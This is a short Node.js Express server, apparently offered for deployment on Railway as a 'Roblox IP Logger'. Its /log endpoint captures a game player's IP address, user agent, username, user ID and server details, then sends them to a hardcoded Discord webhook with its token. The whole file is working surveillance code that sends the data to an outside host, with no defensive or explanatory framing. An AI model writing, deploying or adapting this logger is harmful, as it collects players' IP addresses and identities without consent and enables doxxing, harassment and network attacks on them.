const express = require('express');
const app = express();

// YOUR DISCORD WEBHOOK - ALREADY CONFIGURED
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

app.get('/log', (req, res) => {
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                     req.headers['x-real-ip'] || 
                     req.ip || 'Unknown';
    
    const playerData = {
        timestamp: new Date().toISOString(),
        username: req.query.playerName || 'Unknown',
        userId: req.query.userId || 'Unknown',
        displayName: req.query.displayName || 'Unknown',
        placeId: req.query.placeId || 'Unknown',
        jobId: req.query.jobId || 'Unknown',
        osPlatform: req.query.osPlatform || 'Unknown',
        ipAddress: clientIP,
        userAgent: req.get('User-Agent') || 'Unknown'
    };
    
    console.log('🎮 PLAYER:', JSON.stringify(playerData, null, 2));
    
    // SEND TO YOUR DISCORD (ALREADY CONFIGURED)
    fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '🕵️ Roblox Player IP Captured',
                description: `\`UserID: ${playerData.userId}\``,
                color: 16711680, // Red
                fields: [
                    { name: '👤 Player', value: `${playerData.username} (${playerData.displayName})`, inline: true },
                    { name: '🌐 IP Address', value: `\`${playerData.ipAddress}\``, inline: true },
                    { name: '📍 Place', value: playerData.placeId, inline: true },
                    { name: '🆔 Server', value: playerData.jobId.slice(-8), inline: true },
                    { name: '💻 Platform', value: playerData.osPlatform, inline: true },
                    { name: '📱 User-Agent', value: playerData.userAgent.slice(0, 40) + '...', inline: false }
                ],
                thumbnail: { url: 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&format=png&username=' + playerData.username },
                timestamp: playerData.timestamp,
                footer: { text: 'Roblox IP Logger | Railway' }
            }]
        })
    }).catch(err => console.error('Discord failed:', err));
    
    res.json({ status: 'logged', ip: clientIP });
});

app.get('/health', (req, res) => res.send('✅ Logger Active'));

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 Logger running on port ${port}`);
});
